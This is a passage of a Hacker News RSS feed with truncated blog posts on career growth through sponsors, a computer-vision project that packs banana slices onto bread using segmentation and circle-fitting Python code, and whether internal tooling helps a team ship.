Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24273025">thread link</a>) | @yenkel
<br/>
August 25, 2020 | https://yenkel.dev/posts/how-to-achieve-career-growth-opportunities-skills-sponsors | <a href="https://web.archive.org/web/*/https://yenkel.dev/posts/how-to-achieve-career-growth-opportunities-skills-sponsors">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>I recently started mentoring someone that works at another company. Their goal is to become a “tech lead”: at their company, this is a person that others look for technical advice, and that can influence teams’ technical decisions. Because this person does not work where I do, I was forced to think generically about the matter of growth, rather than jumping to specific advice I would be able to provide a coworker.</p><p>In general, you might want to grow in your software engineering career, but:</p><ul><li>what does growth mean? </li><li>how can you achieve it?</li><li>who decides if you are ready to grow?</li><li>where do you start?</li></ul><p>Years ago I read a phrase in <a href="https://www.forbes.com/sites/daviatemin/2016/04/04/what-theyre-saying-about-you-when-youre-not-in-the-room-and-what-you-can-do-to-influence-it/#4cb99ee771ac" target="_blank" rel="nofollow noopener noreferrer">this article</a> that made many things click for me:</p><blockquote><p>The biggest decisions about your career are often made when you’re not in the room</p></blockquote><p>For example, when I was working at a consulting company I did not decide which projects I was involved in. It depended on the contracts we closed, customers’ budget and other’s allocations.</p><p>Whenever I’m thinking about career growth I keep that in mind.  It helped me put together a mental model for professional growth. This blog post shares my growth model and how you can use it to carve your career growth path.</p><p>Let’s introduce some terms first:</p><ul><li>Growth: access to more challenging and/or new opportunities. Growth is multidimensional.</li><li>Opportunity: a possibility for improving and/or displaying your skills. They might be accompanied by financial rewards, recognition, etc.</li><li>Skills: what you can do, including knowledge required to do it</li></ul><p>From those three definitions a couple of questions arise:</p><ol><li>Who are you displaying your skills to?</li><li>Who gets you access to opportunities?</li></ol><p>To answer those questions and complete the model we need to define <strong>Sponsors</strong>:</p><ul><li>Sponsors: People that are aware of available opportunities and can grant them to you. </li></ul><p>Applying <a href="https://lethain.com/systems-thinking/" target="_blank" rel="nofollow noopener noreferrer">systems thinking</a> to the model we come up with this diagram:
<img src="https://yenkel.dev/media/2020-08-25/growth.png"></p><ol><li>Your opportunities increase as new opportunities are granted to you. This rate depends on your sponsors.</li><li>Your skills improve depending on how fast you learn from your opportunities.</li><li>You get more sponsors the more people have a positive perception of your skills. These displays depend on your skills, e.g.: when you are given the opportunity to present you are displaying your presentation skills. If you are good at presenting, sponsors will perceive that.</li></ol><h2 id="takeaways"><a href="#takeaways" aria-label="takeaways permalink"></a>Takeaways</h2><p>Our <em>growth</em> definition means you want to maximize <em>your opportunities</em>. The most important takeaway is:</p><p><strong>Skill alone doesn’t matter. If no one but yourself knows about your skills, you won’t get any opportunities.</strong></p><p>What you want is to:</p><ol><li>Maximize <strong>Available Opportunities</strong></li><li>Maximize <strong>Sponsors</strong></li></ol><h2 id="your-energy"><a href="#your-energy" aria-label="your energy permalink"></a>Your energy</h2><p>To keep the model simple and the post short I am not including “Your energy” as a stock. Modeling energy is complex:
When you take new opportunities your energy decreases. When you run out of energy you <a href="https://medium.com/hackernoon/why-theres-so-much-burnout-in-software-and-what-to-do-about-it-4ef0297ca7cc" target="_blank" rel="nofollow noopener noreferrer">burnout</a>.
When you do things you enjoy doing or rest (take fewer opportunities) your energy replenishes.
Your energy levels affect your skill learning/improvement rate.
And there are many ways in which your energy levels change that are not part of the system model I propose but impact the system nevertheless…</p><p>You can easily see how this would make the model more complex. However, just because it is harder to model it doesn’t mean you shouldn’t consider energy as part of your approach to growth.</p><p>Opportunities come in different flavors, not all of them are “being tasked to do something”. All of these are opportunities:</p><ul><li>Changing teams to work on a different problem set</li><li>Being picked to technically lead an initiative larger than you have ever lead before</li><li>Speaking at a conference</li><li>Attending a workshop</li><li>Frequently being mentored by a more senior person</li></ul><p><img src="https://yenkel.dev/media/2020-08-25/opportunity.jpg"></p><p>If there are few <strong>Available Opportunities</strong>, it doesn’t matter how good you are, it is very unlikely you will be granted new ones. <strong>Available Opportunities</strong> are also contextual: they depend on your seniority, team, company’s financial situation, etc. You are also not interested in ANY opportunity. There are specific things that you’ll be interested in doing and/or learning.</p><p>With those things in mind, these are some tips for maximizing <strong>Available Opportunities</strong>.</p><ol><li><strong>Pick opportunities based on your growth goals</strong>: If you want to grow as a distributed systems engineer, opportunities related to building mobile applications are likely to help you less than opportunities related to building databases. I recommend avoiding short term goals related to “titles” and instead prioritized improving your skills over time.</li></ol><p>Goals don’t necessarily need to be getting a better title/promoted. A goal in your career can just be “maximizing learning”, which means you need to “maximize learning opportunities” and your “improve rate”.</p><p><a href="https://lethain.com/forty-year-career/" target="_blank" rel="nofollow noopener noreferrer">This article</a> by Will Larson does a great job of explaining how to plan for a long term career.
<a href="https://medium.com/@bellmar/why-is-this-idiot-running-my-engineering-org-c6e815790cdb" target="_blank" rel="nofollow noopener noreferrer">This article</a> by Marianne Belloti talks about some drawbacks of making career decisions based on just looking for higher titles and admiration</p><ol><li><p><strong>Determine how to best get those opportunities</strong>, ideally minimizing <em>“investment”</em> required to get them: </p><p>If you can get the opportunities you are interested in by staying in your current team, that’s great. If that’s not the case: are there other teams in the engineering organization doing what you want? Are there teams in other departments in the organization doing it? If not, then it might be time to change companies.</p><p>The same applies to conference speaking. If there are two similar conferences on the same date, and one of them requires you to fly 14 hours and the other one only 2 hours, you probably want to pick the latter.</p><p>Large companies that have a strict process for granting opportunities based on just “years at the company” are reducing the amount of <strong>Available Opportunities</strong>, regardless of your skills. This is why high growth startups are sometimes so popular for people that want to grow, there are plenty of opportunities.</p></li><li><p><strong>Create your opportunities</strong>: Proactively propose opportunities to sponsors, adding them to the <strong>Available Opportunities</strong> stock. </p><p>Want to get better at automated testing? Do some research to explain how more testing would help the team/company, explain that to the right sponsor (more on that later), and pitch to work on a project related to that next quarter. Simultaneously, reach out to someone in your organization that you believe is great at automated testing and ask them to mentor you.</p></li></ol><h2 id="reorganizations"><a href="#reorganizations" aria-label="reorganizations permalink"></a>Reorganizations</h2><p>Reorganizations might change the <strong>Available Opportunities</strong> a lot, especially at Senior Engineer (or higher) roles. Depending on the reorganization type and size you might get a heads up and be asked for feedback on options regarding where you will land. During those conversations consider the future <strong>Available Opportunities</strong> to decide what to do.</p><p>Having determined the kind of opportunity you want, the next thing is to get the sponsors for those opportunities to think of your skills as a good fit for them. This involves:</p><ol><li>Finding the right sponsor</li><li>Make your skills visible to them</li></ol><p>When you begin your career as a developer, your team’s Manager or Tech Lead is likely your main sponsor. They are aware of opportunities for tasks/work inside the team and they are the ones assigning work.</p><p>As you grow the situation changes, but you <a href="https://staffeng.com/guides/staying-aligned-with-authority" target="_blank" rel="nofollow noopener noreferrer">always need sponsors</a>. Senior Engineer role (or higher) related opportunities might be discussed at a cross-team level, maybe in a forum involving multiple Managers and/or Directors. Principal level engineers might also have a say in nudging decisions about critical initiatives. People’s titles stop being a good indicator of “sponsorship ability”. <strong>In essence, you need to understand the <a href="https://en.wikipedia.org/wiki/Informal_organization" target="_blank" rel="nofollow noopener noreferrer">informal organization</a> and how it relates to the opportunities you are interested in.</strong></p><p>If you are lost, ask someone you trust and is influential for help. This person doesn’t necessarily need to be a coworker. They should be able to provide guidance. </p><p><img src="https://yenkel.dev/media/2020-08-25/sponsors.jpg"></p><h2 id="visibility"><a href="#visibility" aria-label="visibility permalink"></a>Visibility</h2><p>After identifying the right sponsor(s) you need to make your skills (and interest) visible to them (“skill displays”). Remember: this is not about “lying” or “faking it”. This is about generating awareness. </p><p>You can do this in different ways:</p><ol><li><strong>1:1s</strong>: if you can get a 1:1 with the sponsor to chat about opportunities, do it. In general, when you reach out to people asking them to help you grow and learn, their reactions will be helpful and positive. In these situations, it helps to <a href="#self-awareness">be self-aware</a>.</li><li><strong>Generate content</strong>: internal or external content (conference talks, blog posts) allows you to share your skills. If you want more opportunities to work with Kafka maybe doing a Kafka brown bag and inviting the infrastructure tech leads can help.</li><li><strong>Share accomplishments</strong>: The parallel to: “If a tree falls in a forest and no one is around to hear it, does it make a sound?” is “If you reduce AWS expenses by 25% but no one knows about it, did it happen?“. Make sure the right sponsors know what you have achieved. Whenever you do this, make sure you give credit where credit is due.</li></ol><p>The more senior your sponsor the more things they have on their mind. It is hard for them to pay attention and keep in mind the skills and goals of multiple people. </p><p>Make sure you provide visibility in an easy to consume format. There are some specific approaches that you can use to provide visibility about your work:
<a href="https://jvns.ca/blog/brag-documents/" target="_blank" rel="nofollow noopener noreferrer">Brag documents</a> by Julia Evans
<a href="https://lethain.com/career-narratives/" target="_blank" rel="nofollow noopener noreferrer">Career narratives</a> by Will Larson</p><p>Periodically remind sponsors of your skills and goals. Following up with your sponsors and repeating yourself once in a while is fine.</p><p>Some potential sponsors might be biased. If they are negatively biased towards you, you will need a much higher “skill display rate” than a person they aren’t biased against would need to get them to be YOUR sponsor. There might even be cases when they will never become sponsors, no matter how high your “skill display rate”.</p><p>Lara Hogan has a <a href="https://larahogan.me/blog/what-sponsorship-looks-like/" target="_blank" rel="nofollow noopener noreferrer">great blog post</a> on this topic.</p><p>Consider sponsor bias whenever you are looking to decide if a person is “the right sponsor” for you.</p><h3 id="outside-your-company"><a href="#outside-your-company" aria-label="outside your company permalink"></a>Outside your company</h3><p>Sharing your skills in public sites (LinkedIn, Twitter, conference talks, blogs, etc.) creates …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yenkel.dev/posts/how-to-achieve-career-growth-opportunities-skills-sponsors">https://yenkel.dev/posts/how-to-achieve-career-growth-opportunities-skills-sponsors</a></em></p>]]>
            </description>
            <link>https://yenkel.dev/posts/how-to-achieve-career-growth-opportunities-skills-sponsors</link>
            <guid isPermaLink="false">hacker-news-small-sites-24273025</guid>
            <pubDate>Tue, 25 Aug 2020 16:25:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimal Peanut Butter and Banana Sandwiches]]>
            </title>
            <description>
<![CDATA[
Score 285 | Comments 99 (<a href="https://news.ycombinator.com/item?id=24272814">thread link</a>) | @ethanahte
<br/>
August 25, 2020 | https://www.ethanrosenthal.com/2020/08/25/optimal-peanut-butter-and-banana-sandwiches/ | <a href="https://web.archive.org/web/*/https://www.ethanrosenthal.com/2020/08/25/optimal-peanut-butter-and-banana-sandwiches/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      <section>
          <section>
              

              
              
              
              
              


              <article>
                  <div>
<video autoplay="" muted="" loop="loop">
    <source src="https://www.ethanrosenthal.com/videos/optimal-peanut-butter-and-banana/banana_small.mp4" type="video/mp4">
</video>

<p>I was personally useless for most of the Spring of 2020. There was a period of time, though, after the peak in coronavirus cases here in NYC and before the onslaught of police violence here in NYC that I managed to scrounge up the motivation to do something other than drink and maniacally refresh my Twitter feed. I set out to work on something completely meaningless. It was almost therapeutic to work on a project with no value of any kind (<em>insert PhD joke here</em>).</p>
<p>A side effect of having spent 10 years with limited income in college and grad school, 6 of those here in expensive ass NYC, is that I eat of lot of cheap sandwiches, even though I now have a nice Tech™ job. While my sandwich consumption was quite formidable pre-covid, sheltering in place cemented this staple in my diet. I am particularly fond of peanut butter and banana sandwiches, having been introduced to them as a child by my maternal grandfather who ate them regularly.</p>
<p>I start a peanut butter and banana sandwich by spreading peanut butter on two slices of bread. I then slice circular slices of the banana, starting at the end of the banana, and place each slice on one of the pieces of bread until I have a single layer of banana slices. Every time I do this, the former condensed matter physicist in me starts to twitch his eye. You see, I have this urge, this desire, this <em>need</em> to maximize the <a href="https://en.wikipedia.org/wiki/Atomic_packing_factor">packing fraction</a> of the banana slices. That is, I want to maximize the coverage of the banana slices on the bread. Just as bowl-form food is perfect because you get every ingredient in every bite, each bite of my sandwich should yield the same golden ratio of bread, peanut butter, and banana.</p>
<p>If you were a machine learning model (or my wife), then you would tell me to just cut long rectangular strips along the long axis of the banana, but I’m not a sociopath. If life were simple, then the banana slices would be perfect circles of equal diameter, and we could coast along looking up optimal configurations on <a href="http://packomania.com/">packomania</a>. But alas, life is not simple. We’re in the middle of a global pandemic, and banana slices are elliptical with varying size.</p>
<p>So, how do we make optimal peanut butter and banana sandwiches? It’s really quite simple. You take a picture of your banana and bread, pass the image through a deep learning model to locate said items, do some nonlinear curve fitting to the banana, transform to polar coordinates and “slice” the banana along the fitted curve, turn those slices into elliptical polygons, and feed the polygons and bread “box” into a 2D nesting algorithm.</p>
<p>You may have noticed that I supposedly started this project in the Spring, and it’s now August. Like most idiot engineers, I had no idea how complicated this stupid project was going to be, but time’s meaningless in quarantine, so here we are. And here you are! Because I made a pip installable python package <a href="https://github.com/EthanRosenthal/nannernest">nannernest</a> if you want to optimize your own sandwiches, and I’m going to spend the rest of this post describing how this whole godforsaken thing works.</p>
</div>
<div>
<h2 id="sandwich-segmentation">Sandwich Segmentation</h2>
<p>I know that deep learning has been properly commoditized when the easiest part of this project was identifying every pixel that belongs to a banana or slice of bread in an image. Seriously, this step was super easy. I used a pretrained Mask-RCNN torchvision <a href="https://pytorch.org/docs/stable/torchvision/models.html#torchvision.models.detection.maskrcnn_resnet50_fpn">model</a> with a Resnet backbone. The model was pretrained on the COCO <a href="https://cocodataset.org/">dataset</a>, and thankfully the dataset has “banana” as segmentation category, along with “sandwich” and “cake” which were close enough categories for suitable detection of most slices of bread.</p>
<p>Passing an image through the model outputs a bunch of detected objects, where each detected object has an associated <code>label</code>, <code>score</code>, <code>bounding box</code>, and <code>mask</code>, where the mask identifies the pixels that correspond to the object with a weight at each pixel corresponding to the model’s confidence in that pixel’s label.</p>
<p>Because there could be multiple bananas and slices of bread in the image, I pick out the banana and slice of bread with the highest score. Below, you can see the model is clearly able to identify the banana and bread, with the mask overlaid in a semi-transparent, radioactive green.</p>
</div>
<div>
<div>
<div><pre><code data-lang="python"><span>%</span><span>config</span> <span>InlineBackend</span><span>.</span><span>figure_format</span> <span>=</span> <span></span><span>'</span><span>retina</span><span>'</span>

<span>from</span> <span>pathlib</span> <span>import</span> <span>Path</span>
<span>import</span> <span>matplotlib.pyplot</span> <span>as</span> <span>plt</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>nannernest</span>

<span>_RC_PARAMS</span> <span>=</span> <span>{</span>
    <span></span><span>"</span><span>figure.figsize</span><span>"</span><span>:</span> <span>(</span><span>8</span><span>,</span> <span>4</span><span>)</span><span>,</span>
    <span></span><span>"</span><span>axes.labelsize</span><span>"</span><span>:</span> <span>16</span><span>,</span>
    <span></span><span>"</span><span>axes.titlesize</span><span>"</span><span>:</span> <span>18</span><span>,</span>
    <span></span><span>"</span><span>axes.spines.right</span><span>"</span><span>:</span> <span>False</span><span>,</span>
    <span></span><span>"</span><span>axes.spines.top</span><span>"</span><span>:</span> <span>False</span><span>,</span>
    <span></span><span>"</span><span>font.size</span><span>"</span><span>:</span> <span>14</span><span>,</span>
    <span></span><span>"</span><span>lines.linewidth</span><span>"</span><span>:</span> <span>2</span><span>,</span>
    <span></span><span>"</span><span>lines.markersize</span><span>"</span><span>:</span> <span>6</span><span>,</span>
    <span></span><span>"</span><span>legend.fontsize</span><span>"</span><span>:</span> <span>14</span><span>,</span>
<span>}</span>
<span>for</span> <span>k</span><span>,</span> <span>v</span> <span>in</span> <span>_RC_PARAMS</span><span>.</span><span>items</span><span>(</span><span>)</span><span>:</span>
    <span>plt</span><span>.</span><span>rcParams</span><span>[</span><span>k</span><span>]</span> <span>=</span> <span>v</span>

<span>DPI</span> <span>=</span> <span>160</span>
</code></pre></div></div>
</div>
<div>
<div>
<div><pre><code data-lang="python"><span>image</span><span>,</span> <span>banana</span><span>,</span> <span>bread</span> <span>=</span> <span>nannernest</span><span>.</span><span>segmentation</span><span>.</span><span>run</span><span>(</span><span>Path</span><span>(</span><span></span><span>"</span><span>pre_sandwich.jpg</span><span>"</span><span>)</span><span>)</span>
</code></pre></div></div>
</div>
<div>
<div>
<div><pre><code data-lang="python"><span>nannernest</span><span>.</span><span>viz</span><span>.</span><span>plot</span><span>(</span><span>image</span><span>,</span> <span>banana</span><span>=</span><span>banana</span><span>,</span> <span>bread</span><span>=</span><span>bread</span><span>,</span> <span>show</span><span>=</span><span>True</span><span>,</span> <span>dpi</span><span>=</span><span>DPI</span><span>)</span>
</code></pre></div></div>



<figure>
    
        <img src="https://www.ethanrosenthal.com/2020/08/25/optimal-peanut-butter-and-banana-sandwiches/index_4_0.png"> </figure>

</div>
<div>
<h2 id="what-shape-does-a-banana-makehttpswwwyoutubecomwatchv3o1ad4lzygk"><a href="https://www.youtube.com/watch?v=3O1ad4lZYGk">What shape does a banana make?</a></h2>
<p>Now that we have identified the banana in the image, we need to virtually “slice” it. This is where we are first introduced to the universal pain of computer vision:</p>
<p><em>By eye, I can see exactly what I want to do; by code, it’s so damn difficult.</em></p>
<p>I could ask you to draw lines on the banana identifying where you would slice it, and you could easily draw well-spaced, somewhat parallel slices. It’s not so easy to do this with code. However, I would also argue that this is the fun part of the problem. There are many ways to solve this, and it feels creative, as opposed to using a pre-trained deep learning model. On the other hand, “creatively” solving these problems likely leads to more brittle solutions compared to deep learning models trained on millions of examples. There’s a tradeoff here.</p>
<p>I tried a bunch of analytical solutions based on ellipses, but nothing seemed to work quite right. I ended up landing on a somewhat simpler solution that may not be robust to straight bananas, but who cares – this is a silly project anyway. Using the wonderful <a href="https://scikit-image.org/">scikit-image</a> library, I first calculate the <a href="https://scikit-image.org/docs/dev/auto_examples/edges/plot_skeleton.html">skeleton</a> of the banana segmentation mask. This reduces the mask to a one pixel wide representation which effectively creates a curve that runs along the long axis of the banana.</p>
</div>
<div>
<div>
<div><pre><code data-lang="python"><span>slices</span><span>,</span> <span>banana_circle</span><span>,</span> <span>banana_centroid</span><span>,</span> <span>banana_skeleton</span> <span>=</span> <span>nannernest</span><span>.</span><span>slicing</span><span>.</span><span>run</span><span>(</span>
    <span>banana</span><span>.</span><span>mask</span>
<span>)</span>
</code></pre></div></div>
</div>
<div>
<div>
<div><pre><code data-lang="python"><span>nannernest</span><span>.</span><span>viz</span><span>.</span><span>plot</span><span>(</span><span>image</span><span>,</span> <span>banana_skeleton</span><span>=</span><span>banana_skeleton</span><span>,</span> <span>show</span><span>=</span><span>True</span><span>,</span> <span>dpi</span><span>=</span><span>DPI</span><span>)</span>
</code></pre></div></div>



<figure>
    
        <img src="https://www.ethanrosenthal.com/2020/08/25/optimal-peanut-butter-and-banana-sandwiches/index_7_0.png"> </figure>

</div>
<p>I then fit a circle to the banana skeleton using a nice scipy-based least squares optimization I found <a href="https://scipy-cookbook.readthedocs.io/items/Least_Squares_Circle.html#Using-scipy.optimize.leastsq">here</a>. I actually originally tried to fit this with PyTorch and totally failed, likely due to the fact that this is actually a nonlinear optimization problem.</p>
<div>
<div>
<div><pre><code data-lang="python"><span>nannernest</span><span>.</span><span>viz</span><span>.</span><span>plot</span><span>(</span>
    <span>image</span><span>,</span>
    <span>banana_skeleton</span><span>=</span><span>banana_skeleton</span><span>,</span>
    <span>banana_circle</span><span>=</span><span>banana_circle</span><span>,</span>
    <span>show</span><span>=</span><span>True</span><span>,</span>
    <span>dpi</span><span>=</span><span>DPI</span><span>,</span>
<span>)</span>
</code></pre></div></div>



<figure>
    
        <img src="https://www.ethanrosenthal.com/2020/08/25/optimal-peanut-butter-and-banana-sandwiches/index_9_0.png"> </figure>

</div>
<div>
<h2 id="rad-coordinate-transformations">Rad Coordinate Transformations</h2>
<p>With the circle fit to the banana, the goal is to now draw radial lines out from the center of the circle to the banana and have each radial line correspond to the slice of a knife. Again, while it’s easy to visualize this, it’s much harder in practice. For example, we need to start slicing at one end of the banana, but how do we find an end of the banana? Also, there are two ends, and we have to differentiate between them. Contrary to the behavior of <a href="https://www.thekitchn.com/why-you-should-peel-your-banana-like-a-monkey-206322">monkeys</a>, I start slicing my bananas at the stem end, and that’s what we’re going to do here.</p>
<p>Crucially, because we now have this circle and want to cut radial slices, we must transform from cartesian to polar coordinates and orient ourselves both radially and angularly with respect to the banana. As a start for orienting ourselves angularly, we calculate the <em>centroid</em> of the banana mask, which corresponds to the center of mass of the banana mask if the banana mask were a 2D object. The centroid is shown below as a red dot.</p>
<p>We now draw a radial line originating from the banana circle and passing through the centroid, shown as the dashed white line below. We will consider that line to mark our <em>reference</em> angle which orients us to the center of the banana.</p>
</div>
<div>
<div>
<div><pre><code data-lang="python"><span>ax</span> <span>=</span> <span>nannernest</span><span>.</span><span>viz</span><span>.</span><span>plot</span><span>(</span>
    <span>image</span><span>,</span>
    <span>banana_skeleton</span><span>=</span><span>banana_skeleton</span><span>,</span>
    <span>banana_circle</span><span>=</span><span>banana_circle</span><span>,</span>
    <span>banana_centroid</span><span>=</span><span>banana_centroid</span><span>,</span>
    <span>show</span><span>=</span><span>False</span><span>,</span>
    <span>dpi</span><span>=</span><span>DPI</span><span>,</span>
<span>)</span>

<span>dy</span> <span>=</span> <span>banana_centroid</span><span>[</span><span>0</span><span>]</span> <span>-</span> <span>banana_circle</span><span>.</span><span>yc</span>
<span>dx</span> <span>=</span> <span>banana_centroid</span><span>[</span><span>1</span><span>]</span> <span>-</span> <span>banana_circle</span><span>.</span><span>xc</span>
<span>reference_angle</span> <span>=</span> <span>np</span><span>.</span><span>arctan2</span><span>(</span><span>dy</span><span>,</span> <span>dx</span><span>)</span>
<span>radius</span> <span>=</span> <span>np</span><span>.</span><span>sqrt</span><span>(</span><span>dx</span> <span>*</span><span>*</span> <span>2</span> <span>+</span> <span>dy</span> <span>*</span><span>*</span> <span>2</span><span>)</span>

<span>radial_end_point</span> <span>=</span> <span>(</span>
    <span>banana_circle</span><span>.</span><span>xc</span> <span>+</span> <span>2</span> <span>*</span> <span>radius</span> <span>*</span> <span>np</span><span>.</span><span>cos</span><span>(</span><span>reference_angle</span><span>)</span><span>,</span>
    <span>banana_circle</span><span>.</span><span>yc</span> <span>+</span> <span>2</span> <span>*</span> <span>radius</span> <span>*</span> <span>np</span><span>.</span><span>sin</span><span>(</span><span>reference_angle</span><span>)</span><span>,</span>
<span>)</span>

<span>ax</span><span>.</span><span>plot</span><span>(</span>
    <span>(</span><span>banana_circle</span><span>.</span><span>xc</span><span>,</span> <span>radial_end_point</span><span>[</span><span>0</span><span>]</span><span>)</span><span>,</span>
    <span>(</span><span>banana_circle</span><span>.</span><span>yc</span><span>,</span> <span>radial_end_point</span><span>[</span><span>1</span><span>]</span><span>)</span><span>,</span>
    <span>color</span><span>=</span><span></span><span>"</span><span>white</span><span>"</span><span>,</span>
    <span>linestyle</span><span>=</span><span></span><span>"</span><span>--</span><span>"</span><span>,</span>
    <span>linewidth</span><span>=</span><span>1</span><span>,</span>
<span>)</span>
<span>None</span>
</code></pre></div></div>



<figure>
    
        <img src="https://www.ethanrosenthal.com/2020/08/25/optimal-peanut-butter-and-banana-sandwiches/index_11_0.png"> </figure>

</div>
<p>Using <code>scikit-image</code>, we calculate the segmentation <code>mask</code> intensity along this radial line using the <code>profile_line</code> function. Because our line is passing at an angle along discrete <code>mask</code> pixels (aka matrix entries), we take an average of neighboring points along the radial line cut using the <code>linewidth</code> arguments. As you can see, the banana mask pops out a little over 100 points from the banana circle center.</p>
<div>
<div>
<div><pre><code data-lang="python"><span>from</span> <span>skimage</span> <span>import</span> <span>measure</span>

<span>profile_line</span> <span>=</span> <span>measure</span><span>.</span><span>profile_line</span><span>(</span>
    <span>banana</span><span>.</span><span>mask</span><span>.</span><span>T</span><span>,</span> <span>banana_circle</span><span>.</span><span>center</span><span>,</span> <span>radial_end_point</span><span>,</span> <span>linewidth</span><span>=</span><span>2</span><span>,</span> <span>mode</span><span>=</span><span></span><span>"</span><span>constant</span><span>"</span>
<span>)</span>
</code></pre></div></div>
</div>
<div>
<div>
<div><pre><code data-lang="python"><span>fig</span><span>,</span> <span>ax</span> <span>=</span> <span>plt</span><span>.</span><span>subplots</span><span>(</span><span>)</span>
<span>ax</span><span>.</span><span>plot</span><span>(</span><span>profile_line</span><span>)</span>
<span>ax</span><span>.</span><span>set_xlabel</span><span>(</span><span></span><span>"</span><span>Distance from banana circle center</span><span>"</span><span>)</span>
<span>ax</span><span>.</span><span>set_title</span><span>(</span><span></span><span>"</span><span>Mask Intensity</span><span>"</span><span>)</span>
<span>None</span>
</code></pre></div></div>



<figure>
    
        <img src="https://www.ethanrosenthal.com/2020/08/25/optimal-peanut-butter-and-banana-sandwiches/index_14_0.png"> </figure>

</div>
<p>This profile line is what allows us to orient ourselves radially. You can clearly see where the banana starts and ends, in the radial direction. As always, just seeing it is not good enough. We need code to define the start and end of the banana in this direction. The <code>mask</code> tends to be monotonically increasing and then monotonically decreasing along the start and end, respectively. Using this information, there are a couple ways …</p></article></section></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ethanrosenthal.com/2020/08/25/optimal-peanut-butter-and-banana-sandwiches/">https://www.ethanrosenthal.com/2020/08/25/optimal-peanut-butter-and-banana-sandwiches/</a></em></p>]]>
            </description>
            <link>https://www.ethanrosenthal.com/2020/08/25/optimal-peanut-butter-and-banana-sandwiches/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272814</guid>
            <pubDate>Tue, 25 Aug 2020 16:10:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[But does it help you ship?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24272630">thread link</a>) | @misternugget
<br/>
August 25, 2020 | https://thorstenball.com/blog/2020/08/25/but-does-it-help-you-ship/ | <a href="https://web.archive.org/web/*/https://thorstenball.com/blog/2020/08/25/but-does-it-help-you-ship/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p>25 Aug 2020</p>

  <p>Whenever I’m not sure whether I’m spending my time on the right thing I ask
myself: <em>does it help me ship?</em></p>

<p>If what I consider working on is not the thing we want to ship itself, but lies
in the vast grey area of software projects where I could write code all day long
without the user ever noticing, this question helps me decide whether to drop it
or invest some time in it.</p>

<p>Let me illustrate.</p>

<p>One imaginary Friday afternoon I notice that we have a few <code>// TODO</code> comments in our
codebase. Hmm, I could create a bot that looks for those comments whenever a new
commit is pushed. It could use <code>git blame</code> to see who the author is and create a
ticket assigned to them, saying that they should fix their TODO in line X in
file Y, please. And, cherry on top, when a pull request that touches a TODO is
opened, the bot would mark the corresponding ticket as work-in-progress. And
when the pull request is merged, the bot closes the ticket. And when a pull
request merely changes the <code>TODO:</code> into a <code>TODO(poorsoul):</code> then it assigns the
ticket to <code>poorsoul</code>.</p>

<p>Sounds pretty good, right? Turn those TODOs into tickets and never lose a TODO
again.</p>

<p>The problem is: it’s not free. It looks like it is, because the code is quickly
written and it runs as a GitHub action we don’t have to pay for, but it’s not.</p>

<p>It’s <em>another</em> process, <em>another</em> tool, <em>another</em> automated piece in our
machinery. Another thing that needs to be fixed when it ultimately breaks
down, another bit of automation that works 99% of the time, but starts making
funny noises when you slip into the 1% and, say, moved a TODO down five lines by
accident and don’t want the bot to close and re-open tickets, kicking off
another wave of notifications.</p>

<p><em>That’s</em> the actual cost of adding that bot.</p>

<p>The question is do we want to pay it? Does it help me ship? Does it help me ship
<em>more</em>? Or does it help me ship <em>faster</em>, or with less friction, more safely?</p>

<p>If our imaginary codebase has more TODOs than test cases, for example, and these
TODOs are holding us back from shipping because we can’t make a change without
having to ask colleagues what this TODO we just discovered means, then it might
be a good idea to add the bot. Even if we don’t intend to fix all of the TODOs,
but only to finally get an overview and a peek at hidden part of the iceberg. It
helps us ship.</p>

<p>If the code contains more than one <code>TODO: make sure this works</code> and we can’t
ship because changing the code is playing a game of Russian roulette, where
every change could kick off an avalanche of bugs, then yes, this bot would
probably help us ship.</p>

<p>But what if we’re <em>not</em> held back by TODOs? What if we have a total of 18 of them,
and 12 of those have been in the codebase longer than you and I have been at the
company, and, generally speaking, our codebase is in an okay state — is the cost
worth it?</p>

<p>If what’s holding you back from shipping is, say, getting more customer input,
or a brittle release process, or flaky monitoring, or missing tests, then all
the bot does is to add noise. It doesn’t help you ship.</p>

</div></div>]]>
            </description>
            <link>https://thorstenball.com/blog/2020/08/25/but-does-it-help-you-ship/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272630</guid>
            <pubDate>Tue, 25 Aug 2020 15:56:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unpopular Opinion – Data Scientists Should Be More End-to-End]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24272617">thread link</a>) | @importantbrian
<br/>
August 25, 2020 | https://eugeneyan.com/writing/end-to-end-data-science/?mkt_tok=eyJpIjoiWmpBNVlURTRNRE00WXpjMiIsInQiOiJockxCUXB1YmRPOGxvNm40UDhwdEk2dlI0UHhRY0NzTmdDV3ZnbFl4d3p6WGNZRU56Qmh1S2VNXC9zbmR2RUJrTjk4bW1DeVNUVHdBQW50aHdEOXhLd3VPVDRnbmRWOWdiSFFQVTVmaFZwZ3o3N0tLMk9Xdk9sYXBPc0I3Y1FhREoifQ%3D%3D | <a href="https://web.archive.org/web/*/https://eugeneyan.com/writing/end-to-end-data-science/?mkt_tok=eyJpIjoiWmpBNVlURTRNRE00WXpjMiIsInQiOiJockxCUXB1YmRPOGxvNm40UDhwdEk2dlI0UHhRY0NzTmdDV3ZnbFl4d3p6WGNZRU56Qmh1S2VNXC9zbmR2RUJrTjk4bW1DeVNUVHdBQW50aHdEOXhLd3VPVDRnbmRWOWdiSFFQVTVmaFZwZ3o3N0tLMk9Xdk9sYXBPc0I3Y1FhREoifQ%3D%3D">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
